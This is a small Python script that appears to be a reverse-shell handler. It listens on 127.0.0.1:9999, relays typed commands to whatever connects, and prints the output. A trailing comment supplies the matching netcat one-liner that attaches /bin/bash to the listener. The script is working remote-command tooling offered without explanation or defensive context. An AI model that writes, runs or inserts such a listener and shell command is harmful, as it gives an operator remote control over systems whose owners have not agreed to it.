import socket
import select


HOST = "127.0.0.1"
PORT = 9999

def is_socket_valid(socket):
    readable, writable, exceptional = select.select([socket], [], [], 0)
    if not readable:
        return True
    return False

def cmd_loop(session):
    while True:
        if not is_socket_valid(session):
            break
        command = input(f"Session > ")
        command = f'{command}'  # Wrap command in quotes
        session.sendall(command.encode('utf-8') + b"\n")
        data = session.recv(1024).decode()
        if data:
            response_lines = data.split('\n')
            for line in response_lines:
                print(f"{line}")

def main():
    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    listener.bind((HOST, PORT))
    listener.listen()
    mysocket, addr = listener.accept()
    cmd_loop(mysocket)


if __name__ == "__main__":
    main()
    # nc -nv 127.0.0.1 9999 -e /bin/bash